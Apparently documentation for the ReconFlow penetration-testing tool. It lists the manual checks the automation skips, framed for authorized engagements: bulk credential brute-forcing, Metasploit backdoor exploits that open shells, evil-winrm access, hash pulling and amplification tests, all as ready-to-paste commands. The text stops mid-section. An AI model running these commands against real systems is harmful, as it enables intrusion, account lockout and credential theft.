# Mandatory Checks — everything automation doesn't do

> **Step 4 of 5 — always** · [the whole picture](../README.md) · next: rebuild the report with `python3 report.py <folder>`

> [!WARNING]
> **Authorized engagements only.**

**Read this after every run — even a fully automated one.** A finished
`FINDINGS.md` does *not* mean everything was tested. This page is the rest:
every check ReconFlow's automation does not run. Together they cover it all:

| Path | What you do |
|---|---|
| **A** | Automation with Metasploit (**y** / **y**) → **this page** |
| **B** | Automation, recon only (**y** / **N**) → [MANUAL_METASPLOIT.md](MANUAL_METASPLOIT.md) → **this page** |

What automation does run is in [AUTOMATED_TESTING.md](../reference/AUTOMATED_TESTING.md);
[MANUAL_VERIFICATION.md](../reference/MANUAL_VERIFICATION.md) explains how to confirm each
finding by hand.

The page has two parts:

- **Part 1 — Safe checks** (sections 1–2): they only read what the service
  exposes. **`reconflow.py` already ran them** (`safechecks.py`); what's left
  is the little that needs a person (browsing web apps, looking at a
  screen) and the services nothing covers.
- **Part 2 — Dangerous checks** (sections 3–6): they log in, guess, send
  traffic, run code or pull secrets, so **no ReconFlow path ever runs them**
  — not the recon, not the automatic Metasploit run, not `report.py`, not
  any flag. Here "mandatory" means **mandatory to decide**: run each one if
  it's in scope, otherwise mark it *not tested* so the report shows it was
  a decision, not something forgotten.

**Every command on this page runs against all your targets at once** — every
host, on every port the service was found on — Part 1 is run by
`reconflow.py` itself; the rest uses three small helpers (`each`, `each_file`, `msf_rc`; mostly
Part 2). Load the helpers once, then paste the commands as they are: no IPs
or ports to fill in.

## Contents

- [Before you start — run on every target](#before-you-start--run-on-every-target)
- [How to run the Metasploit parts](#how-to-run-the-metasploit-parts)
- [How to record results](#how-to-record-results)
- **Part 1 — Safe checks**
  - [1. Safe checks — already run by reconflow.py](#1-safe-checks--already-run-by-reconflowpy)
  - [2. Services with no automated coverage](#2-services-with-no-automated-coverage)
- **Part 2 — Dangerous checks (never automated)**
  - [3. Risky checks](#3-risky-checks)
  - [4. Credential testing](#4-credential-testing)
  - [5. Exploit confirmations](#5-exploit-confirmations)
  - [6. Other intrusive steps](#6-other-intrusive-steps)
- [What still needs one target at a time](#what-still-needs-one-target-at-a-time)
- [Summary](#summary)

---

## Before you start — run on every target

**1. Go to the output folder and load the helpers** (once per shell — bash
or zsh):

```bash
cd <recon-folder>                                  # the -o folder
source ../tools/rf-helpers.sh                      # output folder inside ReconFlow/; else: source /path/to/ReconFlow/tools/rf-helpers.sh
```

**2. Know the three helpers.** Each reads the per-port target lists ReconFlow
wrote (`targets/port-<port>-<proto>-<service>.txt`), so a service found on
several ports — FTP on 21 *and* 2121 — is covered on all of them.

| Helper | Runs | You write | Saves to |
|---|---|---|---|
| `each NAME SOURCE 'cmd'` | once per host:port | `$T` = the IP, `$P` = the port | `evidence/NAME_<ip>_<port>_1.txt` |
| `each_file NAME SOURCE 'cmd'` | once per port, for tools that take a host list | `$F` = the list file, `$P` = the port | `evidence/NAME_port-<port>_1.txt` |
| `msf_rc NAME SOURCE MODULE ['set …' …]` | writes one msf block per port (or per host) | — | `msf-blocks/NAME.rc` — run it in msfconsole with `resource msf-blocks/NAME.rc` |

**SOURCE** — where the targets come from:

| SOURCE | Means |
|---|---|
| `ftp`, `smb`, `web`, `ssl`, `snmp`, … | every `targets/port-*-<proto>-<service>.txt` (both TCP and UDP) |
| `tcp-dns`, `udp-dns` | one protocol only |
| `445-tcp-smb` | one port only |
| `vulnerabilities/hosts/<finding>.txt` | exactly the hosts of one finding (written by `report.py`) |
| any file of `ip:port` lines | your own list |

The service names are the ones in your `targets/` folder (`ls targets/`). A
service that isn't in the scan is skipped with a note — so you can paste a
whole section without editing it.

**3. Settings** — put them in front of a command, e.g. `RF_DRY=1 each …`:

| Setting | Does |
|---|---|
| `RF_DRY=1` | shows every host:port and command it *would* run — runs nothing. **Use it first on careful engagements.** |
| `RF_TIMEOUT=60` | seconds per host for `each` before it's stopped (`each_file`: `RF_TIMEOUT_FILE=1800`) |
| `RF_N=2` | the `_N` at the end of the evidence name — for a second step on the same host |
| `RF_MSF_ACTION=check` | what `msf_rc` ends each block with (default `run`) |

Commands run with no keyboard input, so nothing hangs waiting for you. For
steps that use `sudo`, run `sudo -v` first so it doesn't need a password
mid-loop.

<details>
<summary>What a helper run looks like</summary>

```text
$ each redis-config redis 'redis-cli -h $T -p $P config get dir'
== redis-config  10.0.0.5:6379  -> evidence/redis-config_10.0.0.5_6379_1.txt
$ T=10.0.0.5 P=6379; redis-cli -h $T -p $P config get dir
1) "dir"
2) "/var/lib/redis"
== redis-config  10.0.0.9:6380  -> evidence/redis-config_10.0.0.9_6380_1.txt
...
rf: redis-config — 2 target(s); output: evidence/redis-config_*
```

```text
$ msf_rc creds-ftp ftp auxiliary/scanner/ftp/ftp_login 'set USERNAME ftp'
rf: wrote msf-blocks/creds-ftp.rc (2 block(s), ends with 'run').
$ cat msf-blocks/creds-ftp.rc
use auxiliary/scanner/ftp/ftp_login
set RHOSTS file:targets/port-21-tcp-ftp.txt
set RPORT 21
set USERNAME ftp
run
back
use auxiliary/scanner/ftp/ftp_login
set RHOSTS file:targets/port-2121-tcp-ftp.txt
set RPORT 2121
...
```

</details>

## How to run the Metasploit parts

Sections 3–6 have lines starting with `msf_rc`. They work in **two steps,
in two places**:

| Step | Where | What happens |
|---|---|---|
| **1. Write** | your normal terminal (bash / zsh), in the output folder, helpers loaded | `msf_rc` **runs nothing**. It writes a small file, `msf-blocks/<name>.rc`, with one ready Metasploit block per port the service was found on |
| **2. Run** | **msfconsole** — started from the same terminal with one line (shown under every `msf_rc` line) | runs those blocks, records the result for the report, exits |

**It covers every target by itself.** Each block loads its hosts from the
target list ReconFlow wrote (`set RHOSTS file:targets/port-445-tcp-smb.txt`)
and sets that port (`set RPORT 445`). SMB on 445 and 139 → two blocks, all
hosts in each. Lines that use `vulnerabilities/hosts/<finding>.txt` get one
block per affected host instead — only the hosts the scan flagged.

### Example — FTP login test, start to finish

**Write the file — your normal terminal:**

```bash
cd <recon-folder>
source /path/to/ReconFlow/tools/rf-helpers.sh
export U=/usr/share/seclists/Usernames/top-usernames-shortlist.txt
export PW=/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt
msf_rc creds-ftp ftp auxiliary/scanner/ftp/ftp_login "set USER_FILE $U" "set PASS_FILE $PW" 'set STOP_ON_SUCCESS true'
cat msf-blocks/creds-ftp.rc        # look at what will run
```

**Then run it — same terminal, one line.** msfconsole starts, loads
`msf-manual.rc` (it records the session to `msf-manual.log` — that's how
the results reach the report), runs every block in the file, and exits:

```bash
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-ftp.rc; exit"
python3 /path/to/ReconFlow/report.py .      # put the results in FINDINGS.md
```

**Every `msf_rc` line in sections 3–6 has its `msfconsole` line right under
it** — copy both together.

**Prefer to stay in msfconsole?** Open it once, keep it open, and type the
`resource` lines yourself:

```bash
msfconsole -q -r msf-manual.rc
```

```text
resource msf-blocks/creds-ftp.rc
```

### Good to know

- **Several at once:** write them all, then one msfconsole start runs them
  together — `msfconsole -q -x "resource msf-manual.rc; resource
  msf-blocks/creds-ftp.rc; resource msf-blocks/creds-ssh.rc; exit"`.
- **No file written?** `msf_rc` says `no targets for '<service>'` — that
  service isn't in the scan; skip it.
- **Stop a run:** Ctrl-C stops the current module; type `exit` to leave
  msfconsole.
- **Close and reopen msfconsole any time** — always with
  `msfconsole -r msf-manual.rc`; the log is appended to, nothing is lost.
- **Started msfconsole another way?** Type
  `spool /full/path/to/<recon-folder>/msf-manual.log` first, or the results
  never reach the report.
- **Only one host?** Skip `msf_rc` and type the block yourself in msfconsole
  (`use …`, `set RHOSTS <ip>`, `set RPORT <port>`, `run`).

---

## How to record results

> [!IMPORTANT]
> **Not every result reaches the report by itself.** Every check on this
> page is marked:
>
> | Mark | Means | What you do |
> |---|---|---|
> | ✅ **Goes into the report by itself** | the report reads the output and recognises the problem | nothing — rebuild the report |
> | ✍️ **You must report this yourself** | the output is saved in `evidence/`, but the report can't understand it (a zone transfer, a list of files, a screenshot) | read the output; if it shows a problem, add a *New findings* block (step 4 below) |
> | ⛔ **Not saved at all** | you do it by hand (a browser, a GUI, an interactive session) | save proof yourself (step 4 below), then add a *New findings* block |
>
> A check you run *without* `each` / `msf_rc` (typed on its own) is never
> saved — always use the commands as written here.

1. **Helper output reaches the report by itself.** Everything `each` saves
   is named `evidence/<name>_<ip>_<port>_<n>.txt`; `report.py` reads every
   such file for a host:port in the scan and runs **the same detection
   rules** over it. Output that shows a known issue (anonymous FTP, open
   relay, empty MySQL password, `uid=` from a shell, an old TLS handshake,
   …) marks that finding **Confirmed** — no checklist editing needed.
2. **Risky checks (section 3)** use the exact evidence names from
   `manual-checklist.md` section 1, so their results land on the checklist
   entries too. Tick *not tested* in the checklist for any you skip.
3. **Metasploit blocks:** run the `msfconsole -q -x "resource msf-manual.rc;
   …"` line under each `msf_rc` line, from the output folder — it records
   the session to `msf-manual.log` for the report. Known results become findings on
   rebuild (a successful login becomes *Weak / default credentials
   accepted*); other `[+]` lines are listed under *Other Metasploit output*.
4. **Things no rule recognises** (a zone transfer, a readable share full of
   HR files, a camera stream): look through the evidence files, then add a
   block under *3. New findings* in `manual-checklist.md`, with `Evidence:`
   pointing to the file. Quick way to look:

   ```bash
   grep -l . evidence/<name>_* | xargs -r head -n 20
   ```

5. **Rebuild the report** — it only reads files, never touches a target:

   ```bash
   python3 /path/to/ReconFlow/report.py .
   ```

---

# Part 1 — Safe checks

## 1. Safe checks — already run by `reconflow.py`

`reconflow.py` runs all the safe, read-only checks by itself at the end of
the scan — share and directory listings, anonymous database access, exposed
web files, TLS proof and more — on every target. **Nothing to start.** What
you do:

1. **Open `FINDINGS.md` → *Safe checks — possible issues*.** Every row is a
   result that may show a problem no rule can judge: the host, what to look
   for, and the evidence file. Real issue → add a *New findings* block in
   `manual-checklist.md` ([how](#how-to-record-results)); not an issue →
   ignore it. Results a rule recognises are already **Confirmed**.
2. **Want every file, not just the possible issues?** `SAFE-CHECKS.md` in
   the output folder lists them all.
3. **Skipped checks** are under *Manual follow-up* with the reason. Some
   only run when asked — add the option to `reconflow.py`, or run just
   those later with `safechecks.py` on the finished folder:

   ```bash
   sudo python3 /path/to/ReconFlow/safechecks.py <recon-folder> --domain corp.example --only dns-axfr
   ```

| Option (`reconflow.py` or `safechecks.py`) | For |
|---|---|
| `--domain corp.example` | DNS zone transfer (needs the domain: from the client, `ldap-rootdse`, certificates or `smb-os-discovery` output) |
| run with `sudo` | NFS read-only mount, iSCSI discovery |
| `--with-data` | sample documents from open CouchDB / Elasticsearch — real data, only if in scope |
| `--testssl` | full `testssl.sh` audit per TLS port (slow) |

What each check does, and how to re-run one by hand:
[SAFE_CHECKS.md](../reference/SAFE_CHECKS.md).

### Still by hand (safe, but needs a person)

| Step | How | Saved? |
|---|---|---|
| Browse every web app | open `http://` **and** `https://` of each port from `web-report.html` — admin panels, directory listings, verbose errors | ⛔ screenshot what you find into `evidence/` |
| Look at the RDP login screen of hosts without NLA | `each_file rdp-shot rdp 'nxc rdp $F --port $P --nla-screenshot'` (screenshots in `~/.nxc/screenshots/`) — **don't log in** | ✍️ copy the ones you use into `evidence/` |
| Watch a camera stream `rtsp-probe` opened | `ffplay rtsp://TARGET:PORT/` | ⛔ screenshot into `evidence/` |
| TLS on STARTTLS services | `RF_TIMEOUT=600 each testssl-smtp smtp 'testssl.sh --quiet --color 0 --starttls smtp $T:$P'` (or `ftp`, `imap`, `pop3`, `ldap`, `postgres`, `mysql`) | ✍️ |
| TFTP with the device's own file names | `export TFTP_FILES="<names>"` then the `tftp-get` command from [SAFE_CHECKS.md → TFTP](../reference/SAFE_CHECKS.md#tftp--read-a-config-file-tftp-has-no-authentication) | ✍️ |

The `each` lines need the helpers loaded ([Before you start](#before-you-start--run-on-every-target)).

---

## 2. Services with no automated coverage

Not dangerous — just not covered. Odd ports, `unknown`, `tcpwrapped`,
r-services and anything without a playbook get no automated checks. Each run
lists them in the output folder:

- `needs-attention/SUMMARY.txt` — the overview
- `needs-attention/port-<n>-<proto>-<name>.txt` — affected IPs and the nmap
  version detail

Their hosts are also in `targets/` (e.g. `targets/port-9999-tcp-unknown.txt`),
so a first look runs on all of them at once — grab each banner:

```bash
each banner unknown 'printf "\r\n\r\n" | nc -w 5 $T $P | head -20'
each banner-tls unknown 'echo | openssl s_client -connect $T:$P 2>/dev/null | head -20'
```

Then work through them with [MANUAL_VERIFICATION.md](../reference/MANUAL_VERIFICATION.md)
(use the service name shown in `needs-attention/` as the source).

> ✍️ **You must report this yourself.** The output is saved in `evidence/`, but the report can't understand it. Read it — if it shows a problem, add it under *3. New findings* in `manual-checklist.md` ([how](#how-to-record-results)).

---

# Part 2 — Dangerous checks (never automated)

> [!IMPORTANT]
> **Every command below needs the setup first** — in each new terminal:
> `cd <recon-folder>` then `source /path/to/ReconFlow/tools/rf-helpers.sh`
> ([Before you start](#before-you-start--run-on-every-target)). Without it you get
> `each: command not found` or `rf: no targets/ folder here`. Afterwards,
> rebuild the report: `python3 /path/to/ReconFlow/report.py .`

## 3. Risky checks

Single checks that act on the target. ReconFlow lists them per host in
`manual-checklist.md` → section 1, `FINDINGS.md` → *Manual follow-up* and
`service-checks/commands.sh` (commented out).

| Check | Service | What it does to the target |
|---|---|---|
| MySQL empty password | mysql | one login try per account with a blank password |
| SMTP open relay | smtp | asks the server to relay mail to an outside domain |
| SMTP user enumeration | smtp | guesses usernames (`RCPT TO` / `VRFY`) from a wordlist |
| Open HTTP proxy | proxy | makes the target fetch an outside website through itself |
| Java RMI remote class loading | rmi | asks the registry to load a class from a remote URL |
| Bind shell confirmation | bindshell | runs a command (`id`) on the target |

**On every target** — run only the lines that are in scope. The evidence
names match `manual-checklist.md`, so results land on those entries and
output that shows the issue marks them **Confirmed**:

```bash
each R_mysql-empty mysql 'nmap -Pn -p$P --script mysql-empty-password $T'
RF_N=2 each R_mysql-empty mysql 'mysql -h $T -P $P -u root --skip-password --connect-timeout=5 -e "select user();"'
each R_smtp-open-relay smtp 'nmap -Pn -p$P --script smtp-open-relay $T'
each R_smtp-user-enum smtp 'nmap -Pn -p$P --script smtp-enum-users $T'
each R_open-proxy proxy 'nmap -Pn -p$P --script http-open-proxy $T'
each R_nse-rmi-vuln-classloader rmi 'nmap -Pn -p$P --script rmi-vuln-classloader $T'
each bindshell-id vulnerabilities/hosts/bindshell.txt 'printf "id\n" | nc -w 5 $T $P'
```

The bind-shell line only targets hosts flagged by the scan
(`vulnerabilities/hosts/bindshell.txt`); a `uid=` line confirms it — report
immediately.

> ✅ **Every line above goes into the report by itself** — and lands on its
> entry in `manual-checklist.md`. For a check you skip, tick *not tested*
> there.

### Confirming a hit

- **MySQL:** `root account has empty password` (nmap) and a `root@…` row
  from the mysql client = confirmed. Metasploit alternative (same single
  login try per host):

  ```bash
  msf_rc mysql-blank mysql auxiliary/scanner/mysql/mysql_login 'set USERNAME root' 'set BLANK_PASSWORDS true'
  msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/mysql-blank.rc; exit"
  ```

- **Open relay:** `Server is an open relay` → confirm by hand on one host:
  `nc TARGET PORT` → `EHLO x`, `MAIL FROM:<a@external1.example>`,
  `RCPT TO:<b@external2.example>` — `250` for the recipient = it would relay.
  Send `RSET`, `QUIT`; never send real mail. (Metasploit's `smtp_relay`
  *does* send a message — don't use it unless that's explicitly in scope.)
- **SMTP user enumeration:** usernames under `smtp-enum-users:` = the server
  confirms which users exist. Metasploit alternative:

  ```bash
  msf_rc smtp-enum smtp auxiliary/scanner/smtp/smtp_enum
  msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/smtp-enum.rc; exit"
  ```

- **Open proxy:** `Potentially OPEN proxy` → confirm with one request per
  proxy — `200` = anyone can relay traffic through it:

  ```bash
  each proxy-confirm proxy 'curl -s -m 15 -x http://$T:$P http://example.com -o /dev/null -w "%{http_code}\n"'
  msf_rc open-proxy proxy auxiliary/scanner/http/open_proxy 'set CHECKURL http://example.com'
  msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/open-proxy.rc; exit"
  ```

- **RMI:** `State: VULNERABLE` = remote class loading enabled (code
  execution). Metasploit's `java_rmi_server` scanner gives the same answer
  without a remote URL (it's in the automatic run).

> ✅ **By itself:** the Metasploit alternatives (`mysql-blank`, `smtp-enum`,
> `open-proxy`) — run in msfconsole started with `msf-manual.rc`.
> ✍️ **Report yourself:** the `proxy-confirm` curl result (`200`).
> ⛔ **Not saved:** the open-relay `nc` session — record it with
> `script -q evidence/relay-confirm_<ip>_<port>_1.txt -c "nc -nv <ip> <port>"`,
> then add a *New findings* block (or tick *confirmed* on the relay entry in
> `manual-checklist.md`).

---

## 4. Credential testing

> [!CAUTION]
> Noisy, and can **lock real accounts**. Run only when credential testing is
> explicitly in scope — and check the lockout policy with the client first.

`metasploit.rc` contains these login modules **commented out**, so the
automatic run never tries a login. After every run, `FINDINGS.md` →
*Manual follow-up* lists the login services it found and did not test.

**1. Set the wordlists once:**

```bash
export U=/usr/share/seclists/Usernames/top-usernames-shortlist.txt
export PW=/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt
```

**2. Copy the pair for each service in scope** — the `msf_rc` line writes
the blocks (one per port the service was found on), the `msfconsole` line
under it runs them and exits. Run the first line of the box once, then
only the pairs you want. A service not in the scan says `no targets` —
then skip its `msfconsole` line:

```bash
LOGIN="set USER_FILE $U"; PASSL="set PASS_FILE $PW"; STOP='set STOP_ON_SUCCESS true'
msf_rc creds-ftp      ftp      auxiliary/scanner/ftp/ftp_login           "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-ftp.rc; exit"
msf_rc creds-ssh      ssh      auxiliary/scanner/ssh/ssh_login           "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-ssh.rc; exit"
msf_rc creds-telnet   telnet   auxiliary/scanner/telnet/telnet_login     "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-telnet.rc; exit"
msf_rc creds-smb      smb      auxiliary/scanner/smb/smb_login           "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-smb.rc; exit"
msf_rc creds-mssql    mssql    auxiliary/scanner/mssql/mssql_login       "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-mssql.rc; exit"
msf_rc creds-mysql    mysql    auxiliary/scanner/mysql/mysql_login       "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-mysql.rc; exit"
msf_rc creds-postgres postgres auxiliary/scanner/postgres/postgres_login "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-postgres.rc; exit"
msf_rc creds-winrm    winrm    auxiliary/scanner/winrm/winrm_login       "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-winrm.rc; exit"
msf_rc creds-mongodb  mongodb  auxiliary/scanner/mongodb/mongodb_login   "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-mongodb.rc; exit"
msf_rc creds-pop3     pop3     auxiliary/scanner/pop3/pop3_login         "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-pop3.rc; exit"
msf_rc creds-rexec    rexec    auxiliary/scanner/rservices/rexec_login   "$LOGIN" "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-rexec.rc; exit"
# no usernames: SNMP takes community strings, VNC only a password
msf_rc creds-snmp     snmp     auxiliary/scanner/snmp/snmp_login 'set PASS_FILE /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt' "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-snmp.rc; exit"
msf_rc creds-vnc      vnc      auxiliary/scanner/vnc/vnc_login           "$PASSL" "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-vnc.rc; exit"
# rlogin / rsh: host-trust check (.rhosts) as root, no password list
msf_rc creds-rlogin   rlogin   auxiliary/scanner/rservices/rlogin_login 'set USERNAME root' "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-rlogin.rc; exit"
msf_rc creds-rsh      rsh      auxiliary/scanner/rservices/rsh_login    'set USERNAME root' "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-rsh.rc; exit"
```

To look before running: `cat msf-blocks/creds-ftp.rc` (after its `msf_rc`
line). A success line (`Success: 'user:pass'`) becomes *Weak / default credentials
accepted* on rebuild.

> ✅ **Every `creds-…` file goes into the report by itself** — as long as
> msfconsole was started with `msf-manual.rc` (that's what records it). This
> includes rlogin / rsh trust logins (`… with no password`).

### IMAP

Metasploit has no IMAP login scanner; hydra takes each port's host list
(`-f` stops at the first hit per host):

```bash
each_file creds-imap imap 'hydra -L $U -P $PW -M $F -s $P -f imap'
```

> ✍️ **You must report this yourself.** The output is saved in `evidence/`, but the report can't understand it. Read it — if it shows a problem, add it under *3. New findings* in `manual-checklist.md` ([how](#how-to-record-results)). A hit looks like `[143][imap] host: … login: … password: …`.

### Default credentials by product

One or a few known pairs per host, not a wordlist — but still login
attempts:

```bash
RF_N=2 each R_mysql-empty mysql 'mysql -h $T -P $P -u root --skip-password --connect-timeout=5 -e "select user();"'
each pg-default postgres 'PGPASSWORD=postgres PGCONNECT_TIMEOUT=5 psql -h $T -p $P -U postgres -c "select version();"'
each_file mssql-sa mssql 'nxc mssql $F --port $P -u sa -p "" --local-auth'
each rabbit-guest amqp 'curl -s -m 10 -u guest:guest http://$T:15672/api/overview | head -c 400'
RF_TIMEOUT=1800 each odat oracle 'odat all -s $T -p $P'
```

`odat` (Oracle SID guessing + default accounts) is noisy — many attempts per
host. RabbitMQ's management UI is on 15672 whatever the AMQP port.

> ✅ **By itself:** the MySQL line (a `root@…` row).
> ✍️ **Report yourself:** Postgres (a version row = logged in), MSSQL (`[+]`
> from nxc), RabbitMQ (JSON instead of `401`), odat (its `[+]` lines).

### Tomcat manager — default credentials

Only the hosts the scan flagged as Tomcat:

```bash
msf_rc creds-tomcat vulnerabilities/hosts/tomcat.txt auxiliary/scanner/http/tomcat_mgr_login "$STOP"
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/creds-tomcat.rc; exit"
```

For a Tomcat on an https port, add `'set SSL true'` and use a list of just
those hosts.

> ✅ **Goes into the report by itself.** `report.py` reads this output; when it shows the problem, the finding is marked **Confirmed**.

### WinRM — using credentials you found

A working login gives a remote shell. Check where a found account works,
on every WinRM host (only with explicit scope):

```bash
each_file winrm-cred winrm 'nxc winrm $F --port $P -u "<user>" -p "<password>"'
```

Then open the shell on the one you need:
`evil-winrm -i TARGET -P PORT -u <user> -p '<password>'`.

> ✍️ **Report yourself:** the nxc result (`(Pwn3d!)` = the account can log in).
> ⛔ **Not saved:** the evil-winrm shell — copy the commands and output you
> want as proof into a file in `evidence/`.

### Device and web login panels

Vendor default credentials for a fingerprinted device (telnet / SSH
banners, `whatweb`, page titles in `web-report.html`) differ per product —
try them by hand and note each attempt.

> ⛔ **Not saved at all** — screenshot or copy a successful login into
> `evidence/`, then add a *New findings* block.

---

## 5. Exploit confirmations

ReconFlow flags these from **version banners only** and names the module in
`FINDINGS.md` as a *Metasploit reference* — it never runs them. Each one
runs code on the target. Use them only with explicit scope.

Each command below targets **only the hosts that finding lists**
(`vulnerabilities/hosts/<finding>.txt`, written by `report.py`) — one msf
block per host:port. Modules that support `check` get `check` first, which
asks the host without exploiting it:

```bash
RF_MSF_ACTION=check msf_rc check-vsftpd     vulnerabilities/hosts/vsftpd-234.txt   exploit/unix/ftp/vsftpd_234_backdoor
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/check-vsftpd.rc; exit"
RF_MSF_ACTION=check msf_rc check-unrealircd vulnerabilities/hosts/unrealircd.txt   exploit/unix/irc/unreal_ircd_3281_backdoor
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/check-unrealircd.rc; exit"
RF_MSF_ACTION=check msf_rc check-distcc     vulnerabilities/hosts/distcc.txt       exploit/unix/misc/distcc_exec
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/check-distcc.rc; exit"
RF_MSF_ACTION=check msf_rc check-jdwp       vulnerabilities/hosts/jdwp.txt         exploit/multi/misc/java_jdwp_debugger
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/check-jdwp.rc; exit"
```

These modules have **no `check`** — the only proof is running them, so
they're written with `run` and need a payload address:

```bash
msf_rc exploit-proftpd vulnerabilities/hosts/proftpd-133c.txt  exploit/unix/ftp/proftpd_133c_backdoor 'set LHOST <your-ip>'
msf_rc exploit-samba   vulnerabilities/hosts/samba-usermap.txt exploit/multi/samba/usermap_script      'set LHOST <your-ip>'
msf_rc exploit-rmi     vulnerabilities/hosts/java-rmi.txt      exploit/multi/misc/java_rmi_server      'set LHOST <your-ip>'
```

These three open a shell when they work, and msfconsole won't exit while a
session is open — so run them **interactively**, one at a time:

```bash
cat msf-blocks/exploit-proftpd.rc          # read it first; set your real IP in LHOST
msfconsole -q -r msf-manual.rc             # stays open at the msf prompt
```

then, at the `msf >` prompt:

```text
resource msf-blocks/exploit-proftpd.rc
```

(`exploit-samba.rc`, `exploit-rmi.rc` the same way.) Note what the session
shows, then `sessions -K` and `exit`.

Read each `.rc` before you run it. A finding with no hosts writes no file.

> ✅ **By itself:** a positive `check` (`The target is vulnerable.` or the
> module's own message) and any `[+]` line from these modules confirm the
> finding — msfconsole started with `msf-manual.rc`.
> ✍️ **Report yourself:** a shell that opens without a `[+]` line
> (`Command shell session 1 opened`) — tick *confirmed* on that finding's
> entry in `manual-checklist.md` and note the session.

| Finding | Module | `check`? |
|---|---|---|
| vsftpd 2.3.4 backdoored release (CVE-2011-2523) | `exploit/unix/ftp/vsftpd_234_backdoor` | yes |
| UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) | `exploit/unix/irc/unreal_ircd_3281_backdoor` | yes |
| distccd exposed (CVE-2004-2687) | `exploit/unix/misc/distcc_exec` | yes |
| Java debug port (JDWP) exposed | `exploit/multi/misc/java_jdwp_debugger` | yes |
| ProFTPD 1.3.3c backdoored release | `exploit/unix/ftp/proftpd_133c_backdoor` | no |
| Samba 3.0.20–3.0.25 usermap_script (CVE-2007-2447) | `exploit/multi/samba/usermap_script` | no |
| Java RMI registry exposed | `exploit/multi/misc/java_rmi_server` | no |

Without Metasploit, the same proofs also run code — on the flagged hosts
only:

```bash
each distcc-proof vulnerabilities/hosts/distcc.txt     'nmap -Pn -p$P --script distcc-cve2004-2687 $T'
each unreal-proof vulnerabilities/hosts/unrealircd.txt 'nmap -Pn -p$P --script irc-unrealircd-backdoor $T'
msf_rc ghostcat ajp auxiliary/admin/http/tomcat_ghostcat
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/ghostcat.rc; exit"
```

`tomcat_ghostcat` (AJP file read, CVE-2020-1938) reads `WEB-INF/web.xml`
from each AJP port.

> ✅ **By itself:** `distcc-proof` (nmap `State: VULNERABLE`) and
> `unreal-proof` (`Looks like trojaned version of unrealircd`).
> ✍️ **Report yourself:** Ghostcat — the file it read is saved to the msf
> loot folder (`File contents save to: …`); copy it to `evidence/`. Ruby DRb has no module in current Metasploit — any
code-execution test there is by hand, on the hosts in
`vulnerabilities/hosts/drb.txt`.

---

## 6. Other intrusive steps

Steps that aren't logins or exploits, but still do more than *look* at the
target — so automation skips them too:

- **Guessing** — trying many values until one works (community strings,
  usernames). Like credential testing: noisy, and it fills the target's logs.
- **Amplification** — asking a server for a large reply that attackers
  could abuse to flood someone else (NTP `monlist`).
- **Writing** — uploading a harmless test file to prove write access, then
  deleting it. It changes files on the target.
- **Heavy scanning** — thousands of requests (web scanners) that can slow a
  service or trip a WAF / IDS.
- **Pulling secrets** — retrieving password hashes or device files.

Run each one only if it's in scope. More detail per service is in
[MANUAL_VERIFICATION.md](../reference/MANUAL_VERIFICATION.md).

| Step | What it does to the target |
|---|---|
| SNMP community-string guessing | tries many community strings |
| Kerberos user enumeration | one auth request per username |
| Memcached amplification | **don't test** — report UDP 11211 reachable (from `memcached-info`) as the finding |
| NTP / DNS amplification | asks for large replies (amplification vector) |
| IKE aggressive mode | pulls a crackable PSK hash |
| IPMI hash dump | retrieves password hashes |
| Printer (PJL) disclosure | reads device info / files; a print job prints real paper |
| RMI method guessing | calls remote methods with guessed signatures |
| git repository guessing | one request per guessed name |
| SIP extension enumeration | guesses extensions; `INVITE` can ring real phones |
| X11 screenshot | captures a user's live screen |
| Write-access tests | writes to the target |
| Heavy web scans | thousands of requests, may trip a WAF/IDS |
| SMTP relay via Metasploit | **sends a real message** — prefer the nmap check in section 3 |

**On every target** — paste only the lines in scope:

```bash
# SNMP community-string guessing — onesixtyone takes each port's host list
each_file snmp-guess snmp 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -i $F -p $P'

# Kerberos user enumeration — needs the domain and your user list
export DOMAIN=corp.example USERS=/path/to/users.txt
each kerbrute kerberos 'kerbrute userenum -d $DOMAIN --dc $T $USERS'

# NTP monlist (ntpdc always uses port 123)
each ntp-monlist ntp 'ntpdc -n -c monlist $T'

# DNS amplification
msf_rc dns-amp udp-dns auxiliary/scanner/dns/dns_amp
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/dns-amp.rc; exit"

# IKE aggressive mode (some gateways need a group name: add --id=<name>)
